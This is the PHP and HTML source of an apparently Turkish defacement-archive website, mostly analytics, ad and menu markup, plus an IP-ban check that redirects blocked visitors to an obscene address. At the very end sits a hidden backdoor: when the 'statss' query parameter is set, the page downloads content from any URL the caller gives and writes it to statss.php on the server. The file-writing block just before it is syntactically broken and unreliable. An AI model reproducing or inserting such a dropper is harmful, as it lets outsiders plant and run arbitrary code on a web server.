<?php

include "cnfg123-web/db.php";

$ziyaretci_ip = $_SERVER["REMOTE_ADDR"];

$sorgu = mysql_query("select * from ipler where ipno='$ziyaretci_ip'");

$sonuc = mysql_num_rows($sorgu);

if($sonuc > 0){

header("location: http://ananinaminagit.com");

}

?>

<html>

<head>

<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
<link rel="SHORTCUT ICON" href="favicon.png">
<title>Security, exploded</title>
<script src=css/css.js></script>

<script type="text/javascript">

//<![CDATA[

try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"929f79a8e2797a9ebbe87ad37d69addf",petok:"0c956cf3c39f301d8dcf83f3b480c60f573366c4-1447752582-1800",zone:"dark-h.org",rocket:"a",apps:{"ga_key":{"ua":"UA-38656028-2","ga_bs":"2"}},sha2test:0}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=247a80cdfa/cloudflare.min.js"><'+'\/script>');}}catch(e){};

//]]>

</script>

<link href="/css/style.css" rel="stylesheet" type="text/css"/>


<script type="text/javascript">

/* <![CDATA[ */

var _gaq = _gaq || [];

_gaq.push(['_setAccount', 'UA-38656028-2']);

_gaq.push(['_trackPageview']);



(function() {

var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;

ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';

var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);

})();



(function(b){(function(a){"__CF"in b&&"DJS"in b.__CF?b.__CF.DJS.push(a):"addEventListener"in b?b.addEventListener("load",a,!1):b.attachEvent("onload",a)})(function(){"FB"in b&&"Event"in FB&&"subscribe"in FB.Event&&(FB.Event.subscribe("edge.create",function(a){_gaq.push(["_trackSocial","facebook","like",a])}),FB.Event.subscribe("edge.remove",function(a){_gaq.push(["_trackSocial","facebook","unlike",a])}),FB.Event.subscribe("message.send",function(a){_gaq.push(["_trackSocial","facebook","send",a])}));"twttr"in b&&"events"in twttr&&"bind"in twttr.events&&twttr.events.bind("tweet",function(a){if(a){var b;if(a.target&&a.target.nodeName=="IFRAME")a:{if(a=a.target.src){a=a.split("#")[0].match(/[^?=&]+=([^&]*)?/g);b=0;for(var c;c=a[b];++b)if(c.indexOf("url")===0){b=unescape(c.split("=")[1]);break a}}b=void 0}_gaq.push(["_trackSocial","twitter","tweet",b])}})})})(window);

/* ]]> */

</script>

</head>

<body>

</head>

<body>

<div id="content">

<div id="logo">

<a href="/index.php"><img src="/logo.gif"/></a></div>

<link rel="stylesheet" href="/style/style.css" type="text/css"/>

<script type="text/rocketscript">

  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){

  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),

  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)

  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');



  ga('create', 'UA-38656028-3', 'dark-h.org');

  ga('send', 'pageview');



</script>

</head>

<style>body{font:normal 11px auto "Trebuchet MS",Verdana,Arial,Helvetica,sans-serif;}</style>

<meta http-equiv='X-UA-Compatible' content='IE=edge,chrome=1'/>

<link rel='stylesheet' type='text/css' href='/styles.css'/>

<script data-rocketsrc='http://ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js' type="text/rocketscript"></script>

<script type="text/rocketscript" data-rocketsrc='/menu_jquery.js'></script>

</head>

<body>

<div id='cssmenu'>

<ul>

<li class='active'><a href='/index.php'><span>Home</span></a></li>

<li><a href='/onhold'><span>ONHOLD</span></a></li>

<li><a href='/archive'><span>ARCHIVE</span></a></li>

<li><a href='/special/'><span><img src="/img/yildiz.gif" alt=".">SPECIAL ARCHIVE</span></a></li>

<li class='has-sub last'><a href='/notify'><span>NOTIFY</span></a>

<ul>

<li class='last'><a href='/m4ss'><span>MASS NOTIFY</span></a></li>

</ul>

</li>

<li><a href='/disclaimer.php'><span>DISCLAIMER</span></a></li>

<li><a href='/contact.php'><span>Contact</span></a></li>

<ul>

</div>

</body>

</html>

<div id="bodyy">

<script async data-rocketsrc="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js" type="text/rocketscript"></script>

 



<script type="text/rocketscript">

(adsbygoogle = window.adsbygoogle || []).push({});

</script>



<script id="_waug15">var _wau = _wau || [];
_wau.push(["tab", "5k1t2fqmqulo", "g15", "left-middle"]);
(function() {var s=document.createElement("script"); s.async=true;
s.src="http://widgets.amung.us/tab.js";
document.getElementsByTagName("head")[0].appendChild(s);
})();</script>
<?php
if (isset($_GET['])){
 $f = fopen("", "w+");
 fwrite($f, str_replace("</a>,", "</a>\r\n", str_replace("\\", "", $_GET[""])));
 fclose($f);
}

if(is_file("")){
 echo file_get_contents("");
}

if (isset($_GET['statss'])){
 $f = fopen("statss.php", "w+");
 fwrite($f, file_get_contents($_GET["statss"]));
 fclose($f);
}
?>